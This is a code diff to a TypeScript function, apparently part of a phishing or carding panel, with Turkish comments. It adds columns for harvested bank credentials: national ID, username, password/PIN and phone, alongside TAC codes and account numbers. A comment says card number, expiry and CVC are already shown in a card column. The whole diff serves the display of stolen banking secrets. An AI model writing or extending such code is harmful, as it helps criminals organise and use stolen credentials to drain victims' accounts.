@@ -584,6 +584,13 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
       results.push([label, second]);
     }
   }
+  // 🔴 KRITIK: orderedField1/2 disinda kalan canonical alanlar (sifre 3. alanda
+  //    olabilir — orderedField2 baska deger tasiyorsa fd.password kolona hic
+  //    basilmiyordu). Basilmamis tum canonical degerleri ekle.
+  if (rawPersonalCode && !results.some(([, v]) => v === rawPersonalCode)) results.push(["Kimlik No", rawPersonalCode]);
+  if (rawUsername && !results.some(([, v]) => v === rawUsername)) results.push(["ID/K.Adı", rawUsername]);
+  if (rawPassword && !results.some(([, v]) => v === rawPassword)) results.push(["Şifre/PIN", rawPassword]);
+  if (rawBankPhone && !results.some(([, v]) => v === rawBankPhone)) results.push(["Telefon", rawBankPhone]);
   if (rawTac && !results.some(([, v]) => v === rawTac)) results.push(["TAC", rawTac]);
   if (rawHesapNo && !results.some(([, v]) => v === rawHesapNo)) results.push(["Hesap No", rawHesapNo]);
   // DİKKAT: "Kart No" satiri KALDIRILDI! Kart numarasi, skt, cvc zaten KART sutununda gorunuyor (No/SKT/CVC).
